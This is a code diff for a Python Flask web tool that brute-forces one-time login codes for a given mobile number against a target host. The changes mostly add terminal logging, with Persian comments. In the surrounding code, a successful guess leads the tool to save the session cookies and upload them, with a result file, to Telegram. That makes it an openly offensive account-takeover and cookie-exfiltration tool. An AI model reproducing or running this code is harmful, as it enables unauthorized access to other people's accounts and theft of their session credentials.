@@ -35,6 +35,7 @@ def send_file_to_telegram(file_path, retries=3):
         try:
             if not os.path.exists(file_path):
                 progress_log.append(f"Error: File {file_path} does not exist!")
+                print(f"Error: File {file_path} does not exist!")  # لاگ به ترمینال
                 return False
             with open(file_path, 'rb') as file:
                 files = {'document': file}
@@ -42,9 +43,11 @@ def send_file_to_telegram(file_path, retries=3):
                 response = requests.post(url, data=data, files=files, timeout=10)
                 response.raise_for_status()
                 progress_log.append(f"File {file_path} sent to Telegram successfully!")
+                print(f"File {file_path} sent to Telegram successfully!")  # لاگ به ترمینال
                 return True
         except (requests.exceptions.RequestException, FileNotFoundError) as e:
             progress_log.append(f"Failed to send {file_path} to Telegram (attempt {attempt + 1}/{retries}): {str(e)}")
+            print(f"Failed to send {file_path} to Telegram (attempt {attempt + 1}/{retries}): {str(e)}")  # لاگ به ترمینال
             if attempt < retries - 1:
                 time.sleep(2)
     return False
@@ -61,11 +64,14 @@ def save_and_send_cookies(cookies, code_str):
     
     if os.path.exists(cookies_file) and os.path.getsize(cookies_file) > 0:
         progress_log.append(f"Cookies saved in {cookies_file}")
+        print(f"Cookies saved in {cookies_file}")  # لاگ به ترمینال
         success = send_file_to_telegram(cookies_file)
         if not success:
             progress_log.append(f"Critical: Failed to send cookies {cookies_file} to Telegram after retries!")
+            print(f"Critical: Failed to send cookies {cookies_file} to Telegram after retries!")  # لاگ به ترمینال
     else:
         progress_log.append(f"Error: Failed to save cookies to {cookies_file}")
+        print(f"Error: Failed to save cookies to {cookies_file}")  # لاگ به ترمینال
 
 def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
     global current_status
@@ -106,30 +112,33 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
         try:
             response = requests.post(url, headers=headers, data=data, timeout=15)
             response.raise_for_status()
-
             try:
                 json_response = response.json()
+                print(f"Response for code {code_str}: {json_response}")  # لاگ پاسخ سرور
                 if json_response.get("success"):
                     msg = (f"Success with code {code_str} (number {counter})!\n"
                            f"Message: {json_response['data']['message']}\n"
                            f"Redirect to: {json_response['data']['redirect']}")
                     progress_log.append(msg)
+                    print(msg)  # لاگ به ترمینال
                     save_and_send_cookies(response.cookies, code_str)
-
                     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                     output_file = f"success_{code_str}_{timestamp}.txt"
                     with open(output_file, 'w', encoding='utf-8') as f:
-                        f.write(msg + f"\nCookies file: {cookies_file}\n")
+                        f.write(msg + f"\nCookies file: cookies_success_{code_str}_{timestamp}.txt\n")
                     progress_log.append(f"Output saved in {output_file}")
+                    print(f"Output saved in {output_file}")  # لاگ به ترمینال
                     send_file_to_telegram(output_file)
                     current_status["error"] = "Success found!"
                     return True
                 else:
                     progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
+                    print(f"Failed with code {code_str} (number {counter}): {json_response}")  # لاگ به ترمینال
                     current_status["processed"] = counter
                     return False
             except json.JSONDecodeError:
                 progress_log.append(f"Error parsing JSON for code {code_str} (number {counter})")
+                print(f"Error parsing JSON for code {code_str} (number {counter})")  # لاگ به ترمینال
                 current_status["error"] = "JSON parsing error"
                 return False
         except requests.exceptions.RequestException as e:
@@ -142,6 +151,7 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                 elif e.response.status_code == 503:
                     error_msg = "Server unavailable (503)"
             progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")
+            print(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")  # لاگ به ترمینال
             current_status["error"] = error_msg
             if attempt < max_retries:
                 time.sleep(2)
@@ -155,6 +165,7 @@ def generate_code(counter):
 def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
     global running, found_success, current_status
     progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")
+    print(f"Starting bruteforce from {start_range} to {end_range}...")  # لاگ به ترمینال
     current_status = {
         "running": True,
         "current_range": {"start": start_range, "end": end_range},
@@ -168,8 +179,10 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
         if not running or found_success:
             if found_success:
                 progress_log.append("Stopping: Successful code found!")
+                print("Stopping: Successful code found!")  # لاگ به ترمینال
             else:
                 progress_log.append("Process stopped manually!")
+                print("Process stopped manually!")  # لاگ به ترمینال
             current_status["running"] = False
             break
 
@@ -188,10 +201,12 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
                         found_success = True
                         running = False
                         progress_log.append("Process stopped because a successful code was found!")
+                        print("Process stopped because a successful code was found!")  # لاگ به ترمینال
                         current_status["running"] = False
                         break
                 except Exception as e:
                     progress_log.append(f"Exception in future: {str(e)}")
+                    print(f"Exception in future: {str(e)}")  # لاگ به ترمینال
                     current_status["error"] = str(e)
 
         current_status["processed"] = batch_end
@@ -200,6 +215,7 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
 
     if not found_success:
         progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
+        print(f"No successful code found in range {start_range:05d}-{end_range:05d}.")  # لاگ به ترمینال
         current_status["running"] = False
 
 @app.route('/start', methods=['POST'])
@@ -217,6 +233,7 @@ def start():
     found_success = False
     progress_log = []
     progress_log.append("Start button clicked!")
+    print("Start button clicked!")  # لاگ به ترمینال
     threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
     return '', 204
 
@@ -225,6 +242,7 @@ def stop():
     global running
     running = False
     progress_log.append("Stop button clicked!")
+    print("Stop button clicked!")  # لاگ به ترمینال
     return '', 204
 
 @app.route('/status', methods=['GET'])
